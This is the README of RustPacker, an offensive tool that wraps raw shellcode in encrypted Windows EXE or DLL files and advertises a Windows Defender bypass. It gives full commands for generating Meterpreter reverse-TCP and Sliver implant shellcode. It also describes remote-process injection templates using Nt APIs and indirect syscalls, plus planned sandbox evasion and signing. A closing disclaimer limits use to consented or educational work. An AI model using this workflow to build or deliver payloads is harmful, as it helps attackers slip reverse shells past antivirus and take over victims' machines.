<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
<strong>Rustpacker</strong>
</h1>

## But, does it bypass Windows Defender ?

Yes! Here with the common metasploit calc exec payload on a Windows 11 host, using the ntCRT template and AES. Last test on 05/07/2023.

![Windows Defender bypass](/img/WinDef%20bypass.png)

# Summary

 - [Quick start](#quick-start)
    - [Podman/Docker setup](#podmandocker-setup)
 - [Full documentation](#full-documentation)
    - [Create shellcode](#create-shellcode)
        - [Metasploit / MSFvenom](#metasploit--msfvenom)
        - [Sliver](#sliver)
    - [Install Rustpacker](#install-rustpacker)
        - [Podman/Docker setup](#podmandocker-setup-1)
        - [Manual install on Kali](#manual-install-on-kali-1)
    - [Use Rustpacker](#use-rustpacker)
        - [Usage examples](#usage-examples)
        - [Deprecated templates](#deprecated-templates)
    - [Are you a Rust developer?](#are-you-a-rust-developer)
    - [Todo](#todo)
    - [Credits](#credits)
    - [Legal disclaimer](#legal-disclaimer)

# Quick start
## Podman/Docker setup
Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
From any internet-connected OS with either Podman or Docker installed:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `podman build -t rustpacker -f Dockerfile`. This operation may take a while.
- Paste your shellcode file in the `shared` folder, and create your first binary :
- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i syscrt -e aes -b exe`

For regular use, you can set an alias:
- On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
- Then: `rustpacker -f shared/calc.raw -i syscrt -e aes -b exe`

# Full documentation

## Create shellcode
RustPacker is compatible with any raw shellcode.

### Metasploit / MSFvenom
You can generate raw MSF shellcode using msfvenom's raw format. Ex:
- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 EXITFUNC=thread -f raw -o msf.bin`

### Sliver
You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
- `generate --mtls 127.0.0.1:443 --format shellcode --os windows --evasion`
- You can use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions (not OPSEC safe), which are required for SGN to work.

## Install Rustpacker

### Podman/Docker setup
Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
From any internet-connected OS with either Podman or Docker installed:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `podman build -t rustpacker -f Dockerfile`
- Paste your shellcode file in the `shared` folder
- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.raw -i ntcrt -e xor -b exe`
- Retrieve the output binary along with the Rust source files in the `output_RANDOM_NAME` folder in `shared`

For regular use, you can set an alias:
- On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
- Then: `rustpacker -f shared/calc.raw -i ntcrt -e xor -b exe`
- The output binary alRetrieve the output binary along with the Rust source files in the `output_RANDOM_NAME` folder in `shared`

### Manual install on Kali
Install dependencies:
- `sudo apt update && sudo apt upgrade -y`
- `sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev`

Install Rust:
- https://www.rust-lang.org/tools/install
- `source $HOME/.cargo/env`
- `rustup target add x86_64-pc-windows-gnu`

Run RustPacker:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `cargo run -- -f shared/calc.raw -i ntcrt -e xor -b exe`

## Use Rustpacker
For now, you can choose from the following templates:
- `winCRT`, which injects your shellcode in a remote process using the following high-level API calls: `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread`. You can supply the target process with `-t`, defaults to `dllhost.exe` otherwise. Uses the official [Windows crates](https://crates.io/crates/windows).
- `ntCRT`, which injects your shellcode in a remote process using the following low-level API calls: `NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx`. You can supply the target process with `-t`, defaults to `dllhost.exe` otherwise.
- `ntAPC`, which executes your shellcode in a new process using the following low-levels API calls: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtQueueApcThread`, `NtTestAlert`.
- `sysCRT`, which injects your shellcode in a remote process using indirect syscalls to the following low-level API: `NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx`. You can supply the target process with `-t`, defaults to `dllhost.exe` otherwise. Uses the [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) project for syscalls.

All the templates are compatible with either XOR or AES encryption, and can generate an EXE or a DLL file. Templates that inject in remote processes are compatible with the `-t` option to target the process of your choice.

### Usage examples
If you want to pack your Sliver shellcode using the `ntCRT` template with AES encryption, target `notepad.exe`, and retrieve an EXE file:
- Generate your raw shellcode from Sliver
- Copy / paste your shellcode file in the `shared` folder of the Rustpacker project
- Using Podman/Docker without alias: `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes -b exe -t notepad.exe`
- Using Podman/Docker with an alias: `rustpacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes -b exe -t notepad.exe`
- Retrieve the output binary along with the Rust source files in the `output_[RANDOM_NAME]`: `target/x86_64-pc-windows-gnu/release/`

If you want to pack your Msfvenom shellcode using the `ntAPC` template with XOR encryption, and retrieve a DLL file:
- Generate your raw shellcode from Msfvenom
- Copy / paste your shellcode file in the `shared` folder of the Rustpacker project
- Using Podman/Docker without alias: `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/msf.bin -i ntapc -e xor -b dll`
- Using Podman/Docker with an alias: `rustpacker -f shared/msf.bin -i ntapc -e xor -b dll`
- Retrieve the output binary along with the Rust source files in the `output_[RANDOM_NAME]`: `target/x86_64-pc-windows-gnu/release/`

### Deprecated templates
These templates are no longer available with RustPacker, but can be found in `RustPacker/templates/OLD/`:
- `ct`, which executes your shellcode by spawning a process using the following API calls: `VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject`. 
- `crt`, which injects your shellcode in the `dllhost.exe` process using the following API calls: `OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread`.

## Are you a Rust developer?
If you have some experience with Rust, you're more than welcome to help !
You can help by:
- Reviewing the code for mistakes / improvements
- Opening issues
- Contacting me on Discord for a more in depth review (nariod#4621)

## Todo
- [X] Port createThread Rust template
- [X] Port createRemoteThread Rust template
- [X] Debug binary file to Vec<u8>
- [X] Debug compiler
- [X] Packer POC
- [X] Migrate to "std::include_bytes"
- [X] Add xor
- [X] Add AES
- [X] Add Sliver SGN support
- [ ] Refactor code
- [X] Write ntCRT template with Nt APIs
- [X] Rewrite all templates using Nt APIs only
- [X] Build dockerfile
- [X] Strip output binaries
- [ ] Add string encryption option with litcrypt or other
- [ ] Add option to choose the target process to inject into
- [ ] Add sandbox evasion option
- [X] Reduce cargo verbosity
- [ ] Generate random name for generated binary
- [ ] Add binary signing support
- [X] Port ntCRT to sysCRT with syscalls
- [ ] Port ntAPC to sysAPC with syscalls
- [X] Write detailed doc
- [X] Support both EXE and DLL formats
- [X] Add semaphore/mutex support to ensure only one instance of the shellcode is running
- [X] Add support for custom process target injections
- [ ] Remove the annoying snake case warnings

## Credits
- [memN0ps](https://github.com/memN0ps) for all his work
- The [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) project
- [trickster0](https://github.com/trickster0) for his [OffensiveRust](https://github.com/trickster0/OffensiveRust) repo
- Rust discord
- StackOverflow
- https://github.com/postrequest/link
- [craiyon](https://www.craiyon.com/) for the Rustpacker logo

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
